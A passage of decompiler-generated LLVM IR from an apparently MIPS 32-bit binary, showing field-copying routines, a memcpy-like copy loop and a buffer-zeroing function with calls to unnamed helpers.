  %v1_407e2c = add i32 %v0_407e2c, 84
  %v2_407e2c = inttoptr i32 %v1_407e2c to i32*
  %v3_407e2c = load i32, i32* %v2_407e2c, align 4
  store i32 %v3_407e2c, i32* %v0.global-to-local, align 4
  %v1_407e34 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e34 = add i32 %v1_407e34, 88
  %v3_407e34 = inttoptr i32 %v2_407e34 to i32*
  store i32 %v3_407e2c, i32* %v3_407e34, align 4
  %v0_407e38 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e38 = add i32 %v0_407e38, 56
  %v2_407e38 = inttoptr i32 %v1_407e38 to i32*
  %v3_407e38 = load i32, i32* %v2_407e38, align 4
  store i32 %v3_407e38, i32* %v0.global-to-local, align 4
  %v1_407e40 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e40 = add i32 %v1_407e40, 60
  %v3_407e40 = inttoptr i32 %v2_407e40 to i32*
  store i32 %v3_407e38, i32* %v3_407e40, align 4
  %v0_407e44 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e44 = add i32 %v0_407e44, 64
  %v2_407e44 = inttoptr i32 %v1_407e44 to i32*
  %v3_407e44 = load i32, i32* %v2_407e44, align 4
  store i32 %v3_407e44, i32* %v0.global-to-local, align 4
  %v1_407e4c = load i32, i32* %s0.global-to-local, align 4
  %v2_407e4c = add i32 %v1_407e4c, 68
  %v3_407e4c = inttoptr i32 %v2_407e4c to i32*
  store i32 %v3_407e44, i32* %v3_407e4c, align 4
  %v0_407e50 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e50 = add i32 %v0_407e50, 72
  %v2_407e50 = inttoptr i32 %v1_407e50 to i32*
  %v3_407e50 = load i32, i32* %v2_407e50, align 4
  store i32 %v3_407e50, i32* %v0.global-to-local, align 4
  %v1_407e58 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e58 = add i32 %v1_407e58, 76
  %v3_407e58 = inttoptr i32 %v2_407e58 to i32*
  store i32 %v3_407e50, i32* %v3_407e58, align 4
  %v0_407e5c = load i32, i32* %s1.global-to-local, align 4
  %v1_407e5c = add i32 %v0_407e5c, 60
  %v2_407e5c = inttoptr i32 %v1_407e5c to i32*
  %v3_407e5c = load i32, i32* %v2_407e5c, align 4
  store i32 %v3_407e5c, i32* %v0.global-to-local, align 4
  %v1_407e64 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e64 = add i32 %v1_407e64, 64
  %v3_407e64 = inttoptr i32 %v2_407e64 to i32*
  store i32 %v3_407e5c, i32* %v3_407e64, align 4
  %v0_407e68 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e68 = add i32 %v0_407e68, 68
  %v2_407e68 = inttoptr i32 %v1_407e68 to i32*
  %v3_407e68 = load i32, i32* %v2_407e68, align 4
  store i32 %v3_407e68, i32* %v0.global-to-local, align 4
  %v1_407e70 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e70 = add i32 %v1_407e70, 72
  %v3_407e70 = inttoptr i32 %v2_407e70 to i32*
  store i32 %v3_407e68, i32* %v3_407e70, align 4
  %v0_407e74 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e74 = add i32 %v0_407e74, 76
  %v2_407e74 = inttoptr i32 %v1_407e74 to i32*
  %v3_407e74 = load i32, i32* %v2_407e74, align 4
  store i32 %v3_407e74, i32* %v0.global-to-local, align 4
  %v1_407e7c = load i32, i32* %s0.global-to-local, align 4
  %v2_407e7c = add i32 %v1_407e7c, 80
  %v3_407e7c = inttoptr i32 %v2_407e7c to i32*
  store i32 %v3_407e74, i32* %v3_407e7c, align 4
  ret i32 %v3_407e74

; uselistorder directives
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 9, 10, 11, 12, 13, 15 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 88, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 84, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 52, { 1, 0 }
  uselistorder i32 48, { 3, 2, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_407ea0() local_unnamed_addr {
dec_label_pc_407ea0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %t6.global-to-local = alloca i32, align 4
  %t7.global-to-local = alloca i32, align 4
  %v0_407ea0 = load i32, i32* @a2, align 4
  %v1_407ea0 = icmp slt i32 %v0_407ea0, 8
  %v2_407ea0 = zext i1 %v1_407ea0 to i32
  store i32 %v2_407ea0, i32* %t0.global-to-local, align 4
  %v2_407ea4 = load i32, i32* @a0, align 4
  br i1 %v1_407ea0, label %dec_label_pc_407f60, label %dec_label_pc_407ea8

dec_label_pc_407ea8:                              ; preds = %dec_label_pc_407ea0
  %v0_407eac = load i32, i32* @a1, align 4
  %v2_407eac = xor i32 %v0_407eac, %v2_407ea4
  %v1_407eb0 = urem i32 %v2_407eac, 4
  store i32 %v1_407eb0, i32* %t0.global-to-local, align 4
  %v1_407eb4 = icmp eq i32 %v1_407eb0, 0
  %v3_407eb4 = sub i32 0, %v0_407eac
  store i32 %v3_407eb4, i32* %t1.global-to-local, align 4
  br i1 %v1_407eb4, label %dec_label_pc_407eb8, label %dec_label_pc_407f84

dec_label_pc_407eb8:                              ; preds = %dec_label_pc_407ea8
  %v1_407ebc = urem i32 %v3_407eb4, 4
  store i32 %v1_407ebc, i32* %t1.global-to-local, align 4
  %v1_407ec0 = icmp eq i32 %v1_407ebc, 0
  %v4_407ec0 = sub i32 %v0_407ea0, %v1_407ebc
  store i32 %v4_407ec0, i32* %a2.global-to-local, align 4
  br i1 %v1_407ec0, label %dec_label_pc_407ed8, label %dec_label_pc_407ec4

dec_label_pc_407ec4:                              ; preds = %dec_label_pc_407eb8
  %v2_407ecc = add i32 %v1_407ebc, %v0_407eac
  store i32 %v2_407ecc, i32* @a1, align 4
  %v2_407ed4 = add i32 %v1_407ebc, %v2_407ea4
  store i32 %v2_407ed4, i32* @a0, align 4
  br label %dec_label_pc_407ed8

dec_label_pc_407ed8:                              ; preds = %dec_label_pc_407eb8, %dec_label_pc_407ec4
  %v0_407f0c10 = phi i32 [ %v2_407ea4, %dec_label_pc_407eb8 ], [ %v2_407ed4, %dec_label_pc_407ec4 ]
  %v1_407ee4 = phi i32 [ %v0_407eac, %dec_label_pc_407eb8 ], [ %v2_407ecc, %dec_label_pc_407ec4 ]
  %v1_407ed8 = urem i32 %v4_407ec0, 32
  store i32 %v1_407ed8, i32* %t0.global-to-local, align 4
  %v2_407edc = icmp eq i32 %v4_407ec0, %v1_407ed8
  %v5_407edc = sub i32 %v4_407ec0, %v1_407ed8
  store i32 %v5_407edc, i32* %a3.global-to-local, align 4
  br i1 %v2_407edc, label %dec_label_pc_407f38, label %dec_label_pc_407ee0

dec_label_pc_407ee0:                              ; preds = %dec_label_pc_407ed8
  %v2_407ee4 = add i32 %v1_407ee4, %v5_407edc
  store i32 %v2_407ee4, i32* %a3.global-to-local, align 4
  store i32 %v1_407ed8, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_407eec

dec_label_pc_407eec:                              ; preds = %dec_label_pc_407eec.dec_label_pc_407eec_crit_edge, %dec_label_pc_407ee0
  %v0_407f0c = phi i32 [ %v0_407f0c.pre, %dec_label_pc_407eec.dec_label_pc_407eec_crit_edge ], [ %v0_407f0c10, %dec_label_pc_407ee0 ]
  %v0_407f10 = phi i32 [ %v0_407eec.pre, %dec_label_pc_407eec.dec_label_pc_407eec_crit_edge ], [ %v1_407ee4, %dec_label_pc_407ee0 ]
  %v1_407eec = inttoptr i32 %v0_407f10 to i32*
  %v2_407eec = load i32, i32* %v1_407eec, align 4
  store i32 %v2_407eec, i32* %t0.global-to-local, align 4
  %v1_407ef0 = add i32 %v0_407f10, 4
  %v2_407ef0 = inttoptr i32 %v1_407ef0 to i32*
  %v3_407ef0 = load i32, i32* %v2_407ef0, align 4
  store i32 %v3_407ef0, i32* %t1.global-to-local, align 4
  %v1_407ef4 = add i32 %v0_407f10, 8
  %v2_407ef4 = inttoptr i32 %v1_407ef4 to i32*
  %v3_407ef4 = load i32, i32* %v2_407ef4, align 4
  store i32 %v3_407ef4, i32* %t2.global-to-local, align 4
  %v1_407ef8 = add i32 %v0_407f10, 12
  %v2_407ef8 = inttoptr i32 %v1_407ef8 to i32*
  %v3_407ef8 = load i32, i32* %v2_407ef8, align 4
  store i32 %v3_407ef8, i32* %t3.global-to-local, align 4
  %v1_407efc = add i32 %v0_407f10, 16
  %v2_407efc = inttoptr i32 %v1_407efc to i32*
  %v3_407efc = load i32, i32* %v2_407efc, align 4
  store i32 %v3_407efc, i32* %t4.global-to-local, align 4
  %v1_407f00 = add i32 %v0_407f10, 20
  %v2_407f00 = inttoptr i32 %v1_407f00 to i32*
  %v3_407f00 = load i32, i32* %v2_407f00, align 4
  store i32 %v3_407f00, i32* %t5.global-to-local, align 4
  %v1_407f04 = add i32 %v0_407f10, 24
  %v2_407f04 = inttoptr i32 %v1_407f04 to i32*
  %v3_407f04 = load i32, i32* %v2_407f04, align 4
  store i32 %v3_407f04, i32* %t6.global-to-local, align 4
  %v1_407f08 = add i32 %v0_407f10, 28
  %v2_407f08 = inttoptr i32 %v1_407f08 to i32*
  %v3_407f08 = load i32, i32* %v2_407f08, align 4
  store i32 %v3_407f08, i32* %t7.global-to-local, align 4
  %v1_407f0c = add i32 %v0_407f0c, 32
  store i32 %v1_407f0c, i32* @a0, align 4
  %v1_407f10 = add i32 %v0_407f10, 32
  store i32 %v1_407f10, i32* @a1, align 4
  %v3_407f14 = inttoptr i32 %v0_407f0c to i32*
  store i32 %v2_407eec, i32* %v3_407f14, align 4
  %v0_407f18 = load i32, i32* %t1.global-to-local, align 4
  %v1_407f18 = load i32, i32* @a0, align 4
  %v2_407f18 = add i32 %v1_407f18, -28
  %v3_407f18 = inttoptr i32 %v2_407f18 to i32*
  store i32 %v0_407f18, i32* %v3_407f18, align 4
  %v0_407f1c = load i32, i32* %t2.global-to-local, align 4
  %v1_407f1c = load i32, i32* @a0, align 4
  %v2_407f1c = add i32 %v1_407f1c, -24
  %v3_407f1c = inttoptr i32 %v2_407f1c to i32*
  store i32 %v0_407f1c, i32* %v3_407f1c, align 4
  %v0_407f20 = load i32, i32* %t3.global-to-local, align 4
  %v1_407f20 = load i32, i32* @a0, align 4
  %v2_407f20 = add i32 %v1_407f20, -20
  %v3_407f20 = inttoptr i32 %v2_407f20 to i32*
  store i32 %v0_407f20, i32* %v3_407f20, align 4
  %v0_407f24 = load i32, i32* %t4.global-to-local, align 4
  %v1_407f24 = load i32, i32* @a0, align 4
  %v2_407f24 = add i32 %v1_407f24, -16
  %v3_407f24 = inttoptr i32 %v2_407f24 to i32*
  store i32 %v0_407f24, i32* %v3_407f24, align 4
  %v0_407f28 = load i32, i32* %t5.global-to-local, align 4
  %v1_407f28 = load i32, i32* @a0, align 4
  %v2_407f28 = add i32 %v1_407f28, -12
  %v3_407f28 = inttoptr i32 %v2_407f28 to i32*
  store i32 %v0_407f28, i32* %v3_407f28, align 4
  %v0_407f2c = load i32, i32* %t6.global-to-local, align 4
  %v1_407f2c = load i32, i32* @a0, align 4
  %v2_407f2c = add i32 %v1_407f2c, -8
  %v3_407f2c = inttoptr i32 %v2_407f2c to i32*
  store i32 %v0_407f2c, i32* %v3_407f2c, align 4
  %v0_407f30 = load i32, i32* @a1, align 4
  %v1_407f30 = load i32, i32* %a3.global-to-local, align 4
  %v2_407f30 = icmp eq i32 %v0_407f30, %v1_407f30
  %v3_407f30 = load i32, i32* %t7.global-to-local, align 4
  %v4_407f30 = load i32, i32* @a0, align 4
  %v5_407f30 = add i32 %v4_407f30, -4
  %v6_407f30 = inttoptr i32 %v5_407f30 to i32*
  store i32 %v3_407f30, i32* %v6_407f30, align 4
  br i1 %v2_407f30, label %dec_label_pc_407f38.loopexit, label %dec_label_pc_407eec.dec_label_pc_407eec_crit_edge

dec_label_pc_407eec.dec_label_pc_407eec_crit_edge: ; preds = %dec_label_pc_407eec
  %v0_407eec.pre = load i32, i32* @a1, align 4
  %v0_407f0c.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_407eec

dec_label_pc_407f38.loopexit:                     ; preds = %dec_label_pc_407eec
  %v0_407f38.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_407f38

dec_label_pc_407f38:                              ; preds = %dec_label_pc_407f38.loopexit, %dec_label_pc_407ed8
  %v0_407f38 = phi i32 [ %v0_407f38.pre, %dec_label_pc_407f38.loopexit ], [ %v4_407ec0, %dec_label_pc_407ed8 ]
  %v1_407f38 = urem i32 %v0_407f38, 4
  store i32 %v1_407f38, i32* %t0.global-to-local, align 4
  %v2_407f3c = icmp eq i32 %v0_407f38, %v1_407f38
  %v5_407f3c = sub i32 %v0_407f38, %v1_407f38
  store i32 %v5_407f3c, i32* %a3.global-to-local, align 4
  br i1 %v2_407f3c, label %dec_label_pc_407f60, label %dec_label_pc_407f40

dec_label_pc_407f40:                              ; preds = %dec_label_pc_407f38
  %v1_407f44 = load i32, i32* @a1, align 4
  %v2_407f44 = add i32 %v1_407f44, %v5_407f3c
  store i32 %v2_407f44, i32* %a3.global-to-local, align 4
  store i32 %v1_407f38, i32* %a2.global-to-local, align 4
  %v1_407f4c31 = inttoptr i32 %v1_407f44 to i32*
  %v2_407f4c32 = load i32, i32* %v1_407f4c31, align 4
  store i32 %v2_407f4c32, i32* %t0.global-to-local, align 4
  %v0_407f5033 = load i32, i32* @a0, align 4
  %v1_407f5034 = add i32 %v0_407f5033, 4
  store i32 %v1_407f5034, i32* @a0, align 4
  %v1_407f5435 = add i32 %v1_407f44, 4
  store i32 %v1_407f5435, i32* @a1, align 4
  %v2_407f5836 = icmp eq i32 %v1_407f5435, %v2_407f44
  %v6_407f5837 = inttoptr i32 %v0_407f5033 to i32*
  store i32 %v2_407f4c32, i32* %v6_407f5837, align 4
  br i1 %v2_407f5836, label %dec_label_pc_407f60.loopexit, label %dec_label_pc_407f4c.dec_label_pc_407f4c_crit_edge

dec_label_pc_407f4c.dec_label_pc_407f4c_crit_edge: ; preds = %dec_label_pc_407f40, %dec_label_pc_407f4c.dec_label_pc_407f4c_crit_edge
  %v0_407f4c.pre = load i32, i32* @a1, align 4
  %v1_407f58.pre = load i32, i32* %a3.global-to-local, align 4
  %v1_407f4c = inttoptr i32 %v0_407f4c.pre to i32*
  %v2_407f4c = load i32, i32* %v1_407f4c, align 4
  store i32 %v2_407f4c, i32* %t0.global-to-local, align 4
  %v0_407f50 = load i32, i32* @a0, align 4
  %v1_407f50 = add i32 %v0_407f50, 4
  store i32 %v1_407f50, i32* @a0, align 4
  %v1_407f54 = add i32 %v0_407f4c.pre, 4
  store i32 %v1_407f54, i32* @a1, align 4
  %v2_407f58 = icmp eq i32 %v1_407f54, %v1_407f58.pre
  %v6_407f58 = inttoptr i32 %v0_407f50 to i32*
  store i32 %v2_407f4c, i32* %v6_407f58, align 4
  br i1 %v2_407f58, label %dec_label_pc_407f60.loopexit, label %dec_label_pc_407f4c.dec_label_pc_407f4c_crit_edge

dec_label_pc_407f60.loopexit:                     ; preds = %dec_label_pc_407f4c.dec_label_pc_407f4c_crit_edge, %dec_label_pc_407f40
  %v0_407f60.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_407f60

dec_label_pc_407f60:                              ; preds = %dec_label_pc_407f60.loopexit, %dec_label_pc_407f38, %dec_label_pc_407ea0
  %v0_407f60 = phi i32 [ %v0_407f60.pre, %dec_label_pc_407f60.loopexit ], [ %v0_407f38, %dec_label_pc_407f38 ], [ %v0_407ea0, %dec_label_pc_407ea0 ]
  %v1_407f60 = icmp slt i32 %v0_407f60, 1
  %v3_407f60 = load i32, i32* @a1, align 4
  %v4_407f60 = add i32 %v3_407f60, %v0_407f60
  store i32 %v4_407f60, i32* @a3, align 4
  br i1 %v1_407f60, label %dec_label_pc_407f7c, label %dec_label_pc_407f68.preheader

dec_label_pc_407f68.preheader:                    ; preds = %dec_label_pc_407f60
  %v1_407f6823 = inttoptr i32 %v3_407f60 to i8*
  %v2_407f6824 = load i8, i8* %v1_407f6823, align 1
  %v3_407f6825 = sext i8 %v2_407f6824 to i32
  store i32 %v3_407f6825, i32* %t0.global-to-local, align 4
  %v0_407f6c26 = load i32, i32* @a0, align 4
  %v1_407f6c27 = add i32 %v0_407f6c26, 1
  store i32 %v1_407f6c27, i32* %a0.global-to-local, align 4
  %v1_407f7028 = add i32 %v3_407f60, 1
  store i32 %v1_407f7028, i32* %a1.global-to-local, align 4
  %v2_407f7429 = icmp eq i32 %v1_407f7028, %v4_407f60
  %v7_407f7430 = inttoptr i32 %v0_407f6c26 to i8*
  store i8 %v2_407f6824, i8* %v7_407f7430, align 1
  br i1 %v2_407f7429, label %dec_label_pc_407f7c, label %dec_label_pc_407f68.dec_label_pc_407f68_crit_edge

dec_label_pc_407f68.dec_label_pc_407f68_crit_edge: ; preds = %dec_label_pc_407f68.preheader, %dec_label_pc_407f68.dec_label_pc_407f68_crit_edge
  %v0_407f68.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_407f74.pre = load i32, i32* @a3, align 4
  %v1_407f68 = inttoptr i32 %v0_407f68.pre to i8*
  %v2_407f68 = load i8, i8* %v1_407f68, align 1
  %v3_407f68 = sext i8 %v2_407f68 to i32
  store i32 %v3_407f68, i32* %t0.global-to-local, align 4
  %v0_407f6c = load i32, i32* %a0.global-to-local, align 4
  %v1_407f6c = add i32 %v0_407f6c, 1
  store i32 %v1_407f6c, i32* %a0.global-to-local, align 4
  %v1_407f70 = add i32 %v0_407f68.pre, 1
  store i32 %v1_407f70, i32* %a1.global-to-local, align 4
  %v2_407f74 = icmp eq i32 %v1_407f70, %v1_407f74.pre
  %v7_407f74 = inttoptr i32 %v0_407f6c to i8*
  store i8 %v2_407f68, i8* %v7_407f74, align 1
  br i1 %v2_407f74, label %dec_label_pc_407f7c, label %dec_label_pc_407f68.dec_label_pc_407f68_crit_edge

dec_label_pc_407f7c:                              ; preds = %dec_label_pc_407f68.preheader, %dec_label_pc_407f68.dec_label_pc_407f68_crit_edge, %dec_label_pc_407f60
  ret i32 %v2_407ea4

dec_label_pc_407f84:                              ; preds = %dec_label_pc_407ea8
  %v1_407f84 = sub i32 0, %v2_407ea4
  %v1_407f88 = urem i32 %v1_407f84, 4
  store i32 %v1_407f88, i32* %a3.global-to-local, align 4
  %v1_407f8c = icmp eq i32 %v1_407f88, 0
  %v4_407f8c = sub i32 %v0_407ea0, %v1_407f88
  store i32 %v4_407f8c, i32* %a2.global-to-local, align 4
  br i1 %v1_407f8c, label %dec_label_pc_407fa8, label %dec_label_pc_407f90

dec_label_pc_407f90:                              ; preds = %dec_label_pc_407f84
  %v2_407f9c = add i32 %v0_407eac, %v1_407f88
  store i32 %v2_407f9c, i32* %a1.global-to-local, align 4
  %v2_407fa4 = add i32 %v1_407f88, %v2_407ea4
  store i32 %v2_407fa4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407fa8

dec_label_pc_407fa8:                              ; preds = %dec_label_pc_407f84, %dec_label_pc_407f90
  %v0_407fbc3 = phi i32 [ %v2_407ea4, %dec_label_pc_407f84 ], [ %v2_407fa4, %dec_label_pc_407f90 ]
  %v1_407fb0 = phi i32 [ %v0_407eac, %dec_label_pc_407f84 ], [ %v2_407f9c, %dec_label_pc_407f90 ]
  %v1_407fa8 = urem i32 %v4_407f8c, 4
  store i32 %v1_407fa8, i32* %t0.global-to-local, align 4
  %v2_407fac = sub i32 %v4_407f8c, %v1_407fa8
  %v2_407fb0 = add i32 %v1_407fb0, %v2_407fac
  store i32 %v2_407fb0, i32* @a3, align 4
  %v1_407fbc38 = add i32 %v0_407fbc3, 4
  store i32 %v1_407fbc38, i32* %a0.global-to-local, align 4
  %v1_407fc039 = add i32 %v1_407fb0, 4
  store i32 %v1_407fc039, i32* %a1.global-to-local, align 4
  %v2_407fc440 = icmp eq i32 %v1_407fc039, %v2_407fb0
  %v6_407fc441 = inttoptr i32 %v0_407fbc3 to i32*
  store i32 %v3_407eb4, i32* %v6_407fc441, align 4
  br i1 %v2_407fc440, label %dec_label_pc_407fc8, label %dec_label_pc_407fb4.dec_label_pc_407fb4_crit_edge

dec_label_pc_407fb4.dec_label_pc_407fb4_crit_edge: ; preds = %dec_label_pc_407fa8, %dec_label_pc_407fb4.dec_label_pc_407fb4_crit_edge
  %v0_407fbc.pre = load i32, i32* %a0.global-to-local, align 4
  %v0_407fc0.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_407fc4.pre = load i32, i32* @a3, align 4
  %v3_407fc4.pre = load i32, i32* %t1.global-to-local, align 4
  %v1_407fbc = add i32 %v0_407fbc.pre, 4
  store i32 %v1_407fbc, i32* %a0.global-to-local, align 4
  %v1_407fc0 = add i32 %v0_407fc0.pre, 4
  store i32 %v1_407fc0, i32* %a1.global-to-local, align 4
  %v2_407fc4 = icmp eq i32 %v1_407fc0, %v1_407fc4.pre
  %v6_407fc4 = inttoptr i32 %v0_407fbc.pre to i32*
  store i32 %v3_407fc4.pre, i32* %v6_407fc4, align 4
  br i1 %v2_407fc4, label %dec_label_pc_407fc8, label %dec_label_pc_407fb4.dec_label_pc_407fb4_crit_edge

dec_label_pc_407fc8:                              ; preds = %dec_label_pc_407fb4.dec_label_pc_407fb4_crit_edge, %dec_label_pc_407fa8
  %v0_407fd0 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_407fd0, i32* %a2.global-to-local, align 4
  ret i32 %v2_407ea4

; uselistorder directives
  uselistorder i32 %v0_407fbc.pre, { 1, 0 }
  uselistorder i32 %v1_407fa8, { 1, 0 }
  uselistorder i32 %v4_407f8c, { 1, 0, 2 }
  uselistorder i32 %v1_407f88, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_407f68.pre, { 1, 0 }
  uselistorder i32 %v0_407f4c.pre, { 1, 0 }
  uselistorder i32 %v1_407f38, { 3, 1, 2, 0 }
  uselistorder i32 %v0_407f38, { 1, 2, 3, 0 }
  uselistorder i32 %v0_407f10, { 0, 2, 1, 4, 3, 6, 5, 8, 7 }
  uselistorder i32 %v0_407f0c, { 1, 0 }
  uselistorder i32 %v1_407ed8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_407ee4, { 1, 0 }
  uselistorder i32 %v4_407ec0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_407ebc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_407eb4, { 1, 0, 2 }
  uselistorder i32 %v1_407eb0, { 1, 0 }
  uselistorder i32 %v0_407eac, { 4, 0, 3, 1, 5, 2 }
  uselistorder i32 %v2_407ea4, { 6, 4, 0, 5, 7, 3, 1, 2 }
  uselistorder i32 %v0_407ea0, { 2, 0, 1, 3 }
  uselistorder i32* %t1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %t0.global-to-local, { 0, 1, 2, 9, 3, 10, 4, 5, 6, 7, 8 }
  uselistorder i32* %a1.global-to-local, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32* %a0.global-to-local, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32* @a3, { 1, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 8, 9, 6, 5, 32, 33, 10, 34, 35, 36, 37, 3, 38, 39, 40, 41, 42, 4, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 7, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32 -8, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 20, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 16, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 2, 29, 0, 30, 31, 32, 33, 34, 35, 3, 36, 37, 38, 4, 39, 5, 40, 41, 42, 6, 7, 8, 1 }
  uselistorder i32 8, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 6, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0, 34, 35, 36, 1, 37, 38, 2, 39, 5, 3, 40, 41, 42, 43, 44, 4, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 8, 9, 10, 7, 70, 71, 72, 73, 74 }
  uselistorder i32* @a2, { 7, 8, 9, 5, 3, 10, 6, 11, 12, 13, 14, 15, 16, 17, 1, 18, 4, 19, 20, 2, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder label %dec_label_pc_407fb4.dec_label_pc_407fb4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407fa8, { 1, 0 }
  uselistorder label %dec_label_pc_407f7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_407f68.dec_label_pc_407f68_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407f4c.dec_label_pc_407f4c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407ed8, { 1, 0 }
}

define i32 @function_407fe0() local_unnamed_addr {
dec_label_pc_407fe0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp10 = alloca i32, align 4
  %tmp11 = alloca i32, align 4
  %v1_407fe8 = load i32, i32* @t9, align 4
  %v2_407fe8 = add i32 %v1_407fe8, 301696
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_406e64.199 to i32), i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_449a50.279 to i32), i32* %a0.global-to-local, align 4
  %v5_408008 = call i32 @function_4052b0(i32* nonnull @global_var_449a50.279)
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  %v2_408014 = ptrtoint i32* %tmp10 to i32
  store i32 %v2_408014, i32* @s0, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  %v2_40802020 = add i32 %v5_408008, %v2_408014
  %v1_40802421 = inttoptr i32 %v2_40802020 to i32*
  store i32 0, i32* %v1_40802421, align 4
  %v0_40802822 = load i32, i32* %v1.global-to-local, align 4
  %v1_40802823 = add i32 %v0_40802822, -1
  store i32 %v1_40802823, i32* %v1.global-to-local, align 4
  %v1_40802c24 = icmp sgt i32 %v1_40802823, -1
  %v3_40802c25 = mul i32 %v1_40802823, 4
  store i32 %v3_40802c25, i32* %v0.global-to-local, align 4
  br i1 %v1_40802c24, label %dec_label_pc_408020.dec_label_pc_408020_crit_edge, label %dec_label_pc_408030

dec_label_pc_408020.dec_label_pc_408020_crit_edge: ; preds = %dec_label_pc_407fe0, %dec_label_pc_408020.dec_label_pc_408020_crit_edge
  %v3_40802c26 = phi i32 [ %v3_40802c, %dec_label_pc_408020.dec_label_pc_408020_crit_edge ], [ %v3_40802c25, %dec_label_pc_407fe0 ]
  %v1_408020.pre = load i32, i32* @s0, align 4
  %v2_408020 = add i32 %v3_40802c26, %v1_408020.pre
  %v1_408024 = inttoptr i32 %v2_408020 to i32*
  store i32 0, i32* %v1_408024, align 4
  %v0_408028 = load i32, i32* %v1.global-to-local, align 4
  %v1_408028 = add i32 %v0_408028, -1
  store i32 %v1_408028, i32* %v1.global-to-local, align 4
  %v1_40802c = icmp sgt i32 %v1_408028, -1
  %v3_40802c = mul i32 %v1_408028, 4
  store i32 %v3_40802c, i32* %v0.global-to-local, align 4
  br i1 %v1_40802c, label %dec_label_pc_408020.dec_label_pc_408020_crit_edge, label %dec_label_pc_408030

dec_label_pc_408030:                              ; preds = %dec_label_pc_408020.dec_label_pc_408020_crit_edge, %dec_label_pc_407fe0
  %v3_408034 = load i32, i32* @global_var_449c64.213, align 4
  store i32 %v3_408034, i32* @t9, align 4
  store i32 %v2_408014, i32* @a0, align 4
  store i32 6, i32* @a1, align 4
  %v1_40803c = call i32 @function_404c80()
  store i32 %v1_40803c, i32* %v0.global-to-local, align 4
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  %v1_408048 = icmp eq i32 %v1_40803c, 0
  store i32 %v2_408014, i32* %a1.global-to-local, align 4
  br i1 %v1_408048, label %dec_label_pc_40804c, label %dec_label_pc_408068

dec_label_pc_40804c:                              ; preds = %dec_label_pc_408030
  store i32 2, i32* %a0.global-to-local, align 4
  %v1_408058 = call i32 @unknown_0()
  store i32 %v1_408058, i32* %v0.global-to-local, align 4
  store i32 %v2_407fe8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_408068

dec_label_pc_408068:                              ; preds = %dec_label_pc_408030, %dec_label_pc_40804c
  %v3_408068 = load i32, i32* @global_var_449a78.2, align 4
  store i32 %v3_408068, i32* %v1.global-to-local, align 4
  %v3_408070 = load i32, i32* @global_var_449e00.280, align 4
  %v1_408078 = icmp eq i32 %v3_408070, 0
  store i32 1, i32* %v0.global-to-local, align 4
